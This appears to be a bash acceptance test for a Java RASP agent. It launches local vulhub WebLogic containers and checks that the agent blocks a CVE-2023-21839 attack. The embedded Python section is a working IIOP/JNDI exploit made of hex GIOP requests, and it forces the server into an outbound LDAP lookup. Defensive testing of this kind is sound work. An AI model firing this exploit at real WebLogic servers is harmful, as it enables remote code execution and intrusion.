#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

image="${OHMYRASP_VULHUB_WEBLOGIC_21839_IMAGE:-vulhub/weblogic:12.2.1.3-2018}"
baseline_name="${OHMYRASP_VULHUB_WEBLOGIC_21839_BASELINE_NAME:-ohmyrasp-weblogic21839-baseline}"
protected_name="${OHMYRASP_VULHUB_WEBLOGIC_21839_PROTECTED_NAME:-ohmyrasp-weblogic21839-protected}"
baseline_port="${OHMYRASP_VULHUB_WEBLOGIC_21839_BASELINE_PORT:-19640}"
protected_port="${OHMYRASP_VULHUB_WEBLOGIC_21839_PROTECTED_PORT:-19641}"
baseline_ldap_port="${OHMYRASP_VULHUB_WEBLOGIC_21839_BASELINE_LDAP_PORT:-21389}"
protected_ldap_port="${OHMYRASP_VULHUB_WEBLOGIC_21839_PROTECTED_LDAP_PORT:-21390}"
host_agent_jar="$(pwd)/agent-java8/build/libs/ohmyrasp-agent-java8.jar"
baseline_dir="logs/vulhub-weblogic-12.2.1.3-21839-java8-baseline"
protected_dir="logs/vulhub-weblogic-12.2.1.3-21839-java8-protected"
payload_dir="logs/vulhub-weblogic-12.2.1.3-21839-java8-payload"
protected_log="${protected_dir}/events.jsonl"
weblogic_listen_port=7001

listener_pid=""

copy_artifacts() {
  local name="$1"
  local dir="$2"
  mkdir -p "$dir"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
    docker exec "$name" sh -lc \
      'tail -n 180 /u01/oracle/user_projects/domains/base_domain/servers/AdminServer/logs/AdminServer.log 2>/dev/null || true' \
      > "${dir}/adminserver.log" 2>&1 || true
  fi
}

cleanup() {
  if [[ -n "$listener_pid" ]]; then
    kill "$listener_pid" >/dev/null 2>&1 || true
  fi
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 60 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

verify_image_java8() {
  docker run --rm --entrypoint sh "$image" -lc 'java -version' \
    > "${payload_dir}/image-java-version.txt" 2>&1
  if ! grep -Fq 'version "1.8.' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "WebLogic CVE-2023-21839 image did not report a Java 8 runtime" >&2
    exit 1
  fi
}

start_listener() {
  local port="$1"
  local marker="$2"
  local output="$3"
  python3 -u -c 'import pathlib, socket, sys
port = int(sys.argv[1])
marker = pathlib.Path(sys.argv[2])
sock = socket.socket()
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind(("0.0.0.0", port))
sock.listen(1)
sock.settimeout(90)
print("LISTEN", port, flush=True)
try:
    conn, addr = sock.accept()
    print("CONNECT", addr, flush=True)
    marker.write_text(str(addr), encoding="utf-8")
    conn.close()
except Exception as exc:
    print("NO_CONNECT", repr(exc), flush=True)
finally:
    sock.close()
' "$port" "$marker" > "$output" 2>&1 &
  listener_pid="$!"
}

wait_listener() {
  local marker="$1"
  local output="$2"
  wait "$listener_pid" || true
  listener_pid=""
  if [[ ! -s "$marker" ]]; then
    cat "$output" >&2 || true
    return 1
  fi
}

stop_listener_without_connection() {
  local marker="$1"
  if [[ -n "$listener_pid" ]]; then
    kill "$listener_pid" >/dev/null 2>&1 || true
    wait "$listener_pid" || true
    listener_pid=""
  fi
  [[ ! -s "$marker" ]]
}

run_iiop_jndi_probe() {
  local target="$1"
  local port="$2"
  local ldap_url="$3"
  local output="$4"
  python3 - "$target" "$port" "$weblogic_listen_port" "$ldap_url" > "$output" 2>&1 <<'PY'
import socket
import sys

target = sys.argv[1]
port = int(sys.argv[2])
expected_listen_port = int(sys.argv[3])
ldap = sys.argv[4]
timeout = 8

def get_version(host, target_port):
    probe = bytes.fromhex(
        "743320392e322e302e300a41533a3235350a484c3a39320a4d5"
        "33a31303030303030300a50553a74333a2f2f746573743a373030310a0a")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((host, target_port))
        sock.send(probe)
        buf = sock.recv(1024)
        version = buf[5:7]
        if len(version) != 2 or version[0] == 0 or version[1] == 0:
            return ""
        return version.decode("ascii", "ignore")
    finally:
        sock.close()

def send_probe():
    version = get_version(target, port)
    if version == "12":
        key1_template = (
            "00424541080103000000000c41646d696e53657276657200000000000000003349"
            "444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743"
            "6f6e74657874416e793a312e3000000000000238000000000000014245412c0000001000"
            "00000000000000{{key1}}")
        key2_template = (
            "00424541080103000000000c41646d696e53657276657200000000000000003349"
            "444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e6743"
            "6f6e74657874416e793a312e30000000000004{{key3}}000000014245412c0000001000"
            "00000000000000{{key1}}")
    elif version == "14":
        key1_template = (
            "00424541080103000000000c41646"
            "d696e53657276657200000000000000003349444c3a7765626c"
            "6f6769632f636f7262612f636f732f6e616d696e672f4e616d6"
            "96e67436f6e74657874416e793a312e30000000000002380000"
            "00000000014245412e000000100000000000000000{{key1}}")
        key2_template = (
            "00424541080103000000000c41646d696e53657276657"
            "200000000000000003349444c3a7765626c6f6769632f636f72"
            "62612f636f732f6e616d696e672f4e616d696e67436f6e74657"
            "874416e793a312e30000000000004{{key3}}00000001424541"
            "2e000000100000000000000000{{key1}}")
    else:
        raise RuntimeError("unsupported WebLogic version response: %r" % version)

    ldap_hex = hex(len(ldap))[2:] + ldap.encode("utf-8").hex()
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(timeout)
    try:
        sock.connect((target, port))
        sock.send(bytes.fromhex("47494f50010200030000001700000002000000000000000b4e616d6553657276696365"))
        buf = sock.recv(1024)
        print("version=%s locate_response=%d" % (version, len(buf)), flush=True)

        ioff = 0x60
        while ioff < len(buf) and buf[ioff] != 0:
            ioff += 1
        while ioff < len(buf) and buf[ioff] == 0:
            ioff += 1
        if ioff + 1 >= len(buf):
            raise RuntimeError("unable to parse locate response port")
        tmport = int(buf[ioff + 1]) | (int(buf[ioff]) << 8)
        if tmport != expected_listen_port:
            raise RuntimeError("unexpected WebLogic listen port %s" % tmport)

        lt = ioff - 0x60
        foff = 0x60 + lt + 0x75
        while foff < len(buf) and buf[foff] == 0:
            foff += 1
        if foff + 8 >= len(buf):
            raise RuntimeError("unable to parse locate response key")
        key1 = buf[foff:foff + 8].hex()
        key2 = (b"\xff\xff\xff\xff" + buf[foff + 4:foff + 8]).hex()
        wls_key1 = key1_template.replace("{{key1}}", key1)

        request3 = (
            "00000003030000000000000000000078" + wls_key1 +
            "0000000b726562696e645f616e79000000000006000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000100000006000000f4000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000100000000000000b8000102000000000d3137322e32362e3131322e310000ec5b0000006400424541080103000000000100000000000000000000002849444c3a6f6d672e6f72672f53656e64696e67436f6e746578742f436f6465426173653a312e30000000000331320000000000014245412a0000001000000000000000005eedafdebc0d227000000001000000010000002c00000000000100200000000300010020000100010501000100010100000000030001010000010109050100010000000f00000020000000000000000000000000000000010000000000000000010000000000000042454103000000140000000000000000" +
            key2 +
            "000000004245410000000004000a03010000000000000001000000047465737400000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a443233374439314342324630463638413a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000000000" +
            ldap_hex)
        request3_size = hex(len(request3) // 2)[2:].rjust(8, "0")
        sock.send(bytes.fromhex("47494f5001020000" + request3_size + request3))
        buf = sock.recv(1024)
        print("rebind1_response=%d" % len(buf), flush=True)

        startoff = 0x64 + lt + 0xc0 + len(target) + 0xac + lt + 0x5d
        while startoff < len(buf) and buf[startoff] != 0x32:
            startoff += 1
        if startoff >= len(buf):
            key3 = b"\x32\x38\x39\x00".hex()
        else:
            key3 = buf[startoff:startoff + 4].hex()
        wls_key2 = key2_template.replace("{{key3}}", key3).replace("{{key1}}", key1)

        request4 = (
            "00000004030000000000000000000078" + wls_key2 +
            "0000000b726562696e645f616e79000000000004000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000142454103000000140000000000000000" +
            key2 +
            "000000004245410000000004000a030100000001000000047465737400000001000000000000001d0000001c000000000000000100000000000000010000000000000000000000007fffff0200000054524d493a7765626c6f6769632e6a6e64692e696e7465726e616c2e466f726569676e4f70617175655265666572656e63653a443233374439314342324630463638413a3344323135323746454435393645463100000000007fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e300000000000" +
            ldap_hex)
        request4_size = hex(len(request4) // 2)[2:].rjust(8, "0")
        sock.send(bytes.fromhex("47494f5001020000" + request4_size + request4))
        buf = sock.recv(1024)
        print("rebind2_response=%d" % len(buf), flush=True)

        sock.send(bytes.fromhex("47494f50010200030000001700000005000000000000000b4e616d6553657276696365"))
        buf = sock.recv(1024)
        print("locate2_response=%d" % len(buf), flush=True)

        request6 = (
            "47494f50010200000000011100000006030000000000000000000078" + wls_key1 +
            "000000087265736f6c76650000000004000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000142454103000000140000000000000000" +
            key2 +
            "000000004245410000000004000a030100000000000000010000000574657374000000000000000100")
        sock.send(bytes.fromhex(request6))
        buf = sock.recv(1024)
        print("resolve1_response=%d" % len(buf), flush=True)

        request7 = (
            "47494f50010200000000011100000007030000000000000000000078" + wls_key2 +
            "000000087265736f6c76650000000004000000050000001c00000000000000010000000d3137322e32362e3131322e310000ec5b000000010000000c00000000000100200501000142454103000000140000000000000000" +
            key2 +
            "000000004245410000000004000a030100000000000000010000000574657374000000000000000100")
        sock.send(bytes.fromhex(request7))
        buf = sock.recv(1024)
        print("resolve2_response=%d" % len(buf), flush=True)
    finally:
        sock.close()

send_probe()
PY
}

start_baseline() {
  docker run -d --name "$baseline_name" \
    --add-host=host.docker.internal:host-gateway \
    -p "${baseline_port}:7001" \
    -e ADMIN_PASSWORD=Welcome1 \
    "$image" >/dev/null
}

start_protected() {
  docker run -d --name "$protected_name" \
    --add-host=host.docker.internal:host-gateway \
    -p "${protected_port}:7001" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java8.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    -e ADMIN_PASSWORD=Welcome1 \
    -e USER_MEM_ARGS="-Djava.security.egd=file:/dev/./urandom -javaagent:/opt/ohmyrasp/ohmyrasp-agent-java8.jar -Dohmyrasp.java8.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java8.block=true" \
    "$image" >/dev/null
}

wait_for_weblogic() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local require_startup="${4:-false}"
  local status startup
  for attempt in $(seq 1 240); do
    status="$(curl_status "${dir}/ready-${attempt}.html" "http://127.0.0.1:${port}/console")"
    startup="yes"
    if [[ "$require_startup" == "true" ]]; then
      startup="no"
      grep -Fq '"event":"ohmyrasp-java8-agent-start"' "$protected_log" && startup="yes"
    fi
    printf 'ready_attempt=%s status=%s startup=%s\n' "$attempt" "$status" "$startup" \
      >> "${dir}/attempts.log"
    if [[ "$status" == "200" || "$status" == "302" || "$status" == "401" || "$status" == "404" ]] \
        && [[ "$startup" == "yes" ]]; then
      cp "${dir}/ready-${attempt}.html" "${dir}/console-ready.html"
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "WebLogic container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "WebLogic did not become ready on ${port}" >&2
  exit 1
}

assert_startup_quiet() {
  if ! grep -Fq '"jndi_hook":"installed"' "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "missing Java 8 JNDI hook startup marker in protected WebLogic container" >&2
    exit 1
  fi
  if grep -Fq '"event":"ohmyrasp-detection"' "$protected_log"; then
    cat "$protected_log" >&2
    echo "protected WebLogic produced a detection before CVE-2023-21839 traffic" >&2
    exit 1
  fi
}

jndi_block_count() {
  grep -Ec '"hook":"InitialContext.lookup".*"algorithm":"java8_jndi_remote_lookup".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

run_baseline() {
  start_listener "$baseline_ldap_port" "${baseline_dir}/ldap.marker" "${baseline_dir}/ldap-listener.log"
  start_baseline
  wait_for_weblogic "$baseline_name" "$baseline_port" "$baseline_dir"
  run_iiop_jndi_probe \
    127.0.0.1 \
    "$baseline_port" \
    "ldap://host.docker.internal:${baseline_ldap_port}/test" \
    "${baseline_dir}/iiop-jndi-probe.log"
  if ! wait_listener "${baseline_dir}/ldap.marker" "${baseline_dir}/ldap-listener.log"; then
    cat "${baseline_dir}/iiop-jndi-probe.log" >&2 || true
    echo "baseline WebLogic CVE-2023-21839 did not connect to the LDAP listener" >&2
    exit 1
  fi
  copy_artifacts "$baseline_name" "$baseline_dir"
  docker rm -f -v "$baseline_name" >/dev/null 2>&1 || true
}

run_protected() {
  start_listener "$protected_ldap_port" "${protected_dir}/ldap.marker" "${protected_dir}/ldap-listener.log"
  start_protected
  wait_for_weblogic "$protected_name" "$protected_port" "$protected_dir" true
  assert_startup_quiet

  local previous_count after_count
  previous_count="$(jndi_block_count)"
  run_iiop_jndi_probe \
    127.0.0.1 \
    "$protected_port" \
    "ldap://host.docker.internal:${protected_ldap_port}/test" \
    "${protected_dir}/iiop-jndi-probe.log"
  sleep 8
  if ! stop_listener_without_connection "${protected_dir}/ldap.marker"; then
    cat "$protected_log" >&2 || true
    echo "protected WebLogic CVE-2023-21839 still connected to the LDAP listener" >&2
    exit 1
  fi

  after_count="$(jndi_block_count)"
  if (( after_count <= previous_count )); then
    cat "$protected_log" >&2 || true
    cat "${protected_dir}/iiop-jndi-probe.log" >&2 || true
    echo "missing java8_jndi_remote_lookup block event for WebLogic CVE-2023-21839" >&2
    exit 1
  fi
  if ! grep -Fq "ldap://host.docker.internal:${protected_ldap_port}/test" "$protected_log"; then
    cat "$protected_log" >&2 || true
    echo "WebLogic CVE-2023-21839 block event did not record the LDAP URL" >&2
    exit 1
  fi
}

mkdir -p /tmp/ohmyrasp-gradle-cache
docker run --rm -u "$(id -u):$(id -g)" \
  -e GRADLE_USER_HOME=/tmp/gradle-cache \
  -v /tmp/ohmyrasp-gradle-cache:/tmp/gradle-cache \
  -v "$(pwd):/workspace" \
  -w /workspace \
  gradle:jdk25 \
  gradle --no-daemon :agent-java8:agentJava8Jar >/dev/null

rm -rf "$baseline_dir" "$protected_dir" "$payload_dir"
mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
: > "$protected_log"
chmod 777 "$protected_dir"
chmod 666 "$protected_log"
docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true

verify_image_java8
run_baseline
run_protected

copy_artifacts "$protected_name" "$protected_dir"
docker rm -f -v "$protected_name" >/dev/null 2>&1 || true

echo "vulhub WebLogic 12.2.1.3 CVE-2023-21839 Java8 acceptance passed"
